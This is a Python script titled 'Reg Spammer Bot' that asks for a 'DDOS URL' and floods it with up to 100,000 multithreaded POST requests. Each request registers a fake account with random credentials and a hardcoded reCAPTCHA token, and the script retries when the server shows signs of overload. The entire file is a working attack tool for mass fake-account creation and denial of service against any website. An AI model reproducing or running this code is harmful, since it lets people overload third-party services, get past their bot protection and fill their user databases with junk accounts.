from time import strftime, gmtime, time, sleep
import os
import random
import binascii
import requests
import socket
import threading
import sys

class TikTok:
    def __init__(self):
        self.added = 0
        self.lock = threading.Lock()
        self.amount = int('100000')
        
        try:
            self.url = input('> DDOS URL: ')
        except ValueError:
            self.close('Integer expected.')


 

    def close(self, message):
        print(f'\n{message}')
        os.system('title [itle [Reg Spammer Bot {self.url}] - Restart required')
        os.system('pause >NUL')
        os.system('title [itle [Reg Spammer Bot {self.url}] - Exiting...')
        os._exit(0)

    def status(self, code, intention):
        if code == 200:
            self.added += 1

        else:
            self.lock.acquire()
            print(f'Error: {intention} | Status Code: {code}')
            self.lock.release()
            self.bot()

    def update_title(self):
        # Avoid ZeroDivisionError
        while self.added == 0:
            sleep(0.2)

        while self.added < self.amount:
            # Elapsed Time / Added * Remaining
            time_remaining = strftime(
                '%H:%M:%S', gmtime(
                    (time() - self.start_time) / self.added * (self.amount - self.added)
                )
            )
            os.system(
                f'title [Reg Spammer Bot {self.url}] - Added: {self.added}/{self.amount} '
                f'({round(((self.added / self.amount) * 100), 3)}%) ^| Active Threads: '
                f'{threading.active_count()} ^| Time Remaining: {time_remaining}'
            )
            sleep(0.2)
        os.system(
            f'title [Reg Spammer Bot {self.url}] - Added: {self.added}/{self.amount} '
            f'({round(((self.added / self.amount) * 100), 3)}%) ^| Active Threads: '
            f'{threading.active_count()} ^| Time Remaining: 00:00:00'
        )

    def bot(self):
        pss = ''.join(random.choice('0123456789') for _ in range(10))
        user =  binascii.hexlify(os.urandom(13))
        mail =  binascii.hexlify(os.urandom(10))
        
        
        data = (
             f'username={user}&email={mail}%40gmail.com&password={pss}&password_confirm={pss}'
            f'register-username={user}&register-email={mail}%40gmail.com&register-password={pss}&register-password2={pss}&g-recaptcha-response=03AGdBq24cbzr1bETC9DCIaS8KCbS4CQ6XrR12tNck4Q7a5SfxX8CGsRoMfX-RZy7dYG6EVfWbjcf99PI8mRktIU4BV7cU6BaVtViABMId_iAdi2yncmKdFU-Ln4NWJxH1jMbMB6fszhDMdMxzWsAX9sBiiu030yyKAlpGTGJrkWhAQDJIz6XQ_U7HBkE1874TbkNn9Oqsg4SZmaZ8snXrlaN9UMGnsyTKwkqaCAfuYVw2i6I7gjKWAZ7EIuJRPcY48aYSznH8bW-Om9gxO6msICeBIfIUsIrrWv7w_slVnaz91lcPOd-WWIFkpuhbLqXafxrOANgogFuhDUZKF8DFoCTBwin4aYVcU3H5JIVh6Bh136B8qaO6qIfNuQNDw_S1uv7ieJUTFvlXSR-CENnKKhtH-t4e8_AeIjFYBSfncbI3Rc75kyi8X-8&doCreate='
        )
        headers = {
           'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br', 
            'Accept-Language': 'th,th-TH;q=0.9,en;q=0.8,vi;q=0.7',
            'Set-Cookie': '__cfduid=dd1b7af267c96a401fe0886f23241b5fc1600132959',
            'Set-Cookie': 'ci_session=6tt2vg0fh4c49uue32fati5ac1qbd4te'  
        }

        try:
            response = requests.post(
                self.url, data=data, headers=headers
            )
        except Exception as e:
            print(f'Error: {e}')
            self.bot()
        else:
            if all(i not in response.text for i in ['Service Unavailable', 'Gateway Timeout']):
                self.status(response.status_code, response.text)
            else:
                self.bot()
            

    def start(self):
        self.start_time = time()
        threading.Thread(target=self.update_title).start()

        for _ in range(self.amount):
            while True:
                if threading.active_count() <= 300:
                    threading.Thread(target=self.bot).start()
                    break

        os.system('pause >NUL')
        os.system('title [itle [Reg Spammer Bot {self.url}] - Exiting...')
        sleep(3)


if __name__ == '__main__':
    os.system('cls && title [itle [Reg Spammer Bot {self.url}]')
    main = TikTok()
    main.start()